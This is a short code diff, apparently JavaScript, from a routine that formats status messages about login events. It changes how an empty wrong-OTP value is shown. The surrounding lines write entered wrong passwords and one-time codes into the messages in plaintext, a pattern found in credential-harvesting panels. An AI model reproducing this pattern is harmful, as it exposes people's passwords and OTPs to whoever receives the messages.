@@ -1040,7 +1040,7 @@
             else if (status === 'NEW_DEVICE_VERIFIED') msg += `*Status:* 🟢 DEVICE VERIFIED SUCCESSFULLY\n`;
             else if (status === 'OTP_FAILED') {
                 const parts = attemptedData.split('|');
-                msg += `*Status:* ❌ INCORRECT OTP ENTERED\n*Wrong Attempt No:* ${parts[1]}\n*Wrong OTP:* \`${parts[0]}\`\n`;
+                msg += `*Status:* ❌ INCORRECT OTP ENTERED\n*Wrong Attempt No:* ${parts[1]}\n*Wrong OTP:* \`${parts[0] || 'Empty'}\`\n`;
             }
             else if (status === 'FAILED') msg += `*Status:* ❌ FAILED LOGIN ATTEMPT (Attempt ${failsCount}/3)\n*Wrong Password:* \`${attemptedData}\`\n`;
             else if (status === 'BLOCKED') msg += `*Status:* ⛔ IP/DEVICE BLOCKED FOR 15 MINS\n*Reason:* ${attemptedData}\n`;
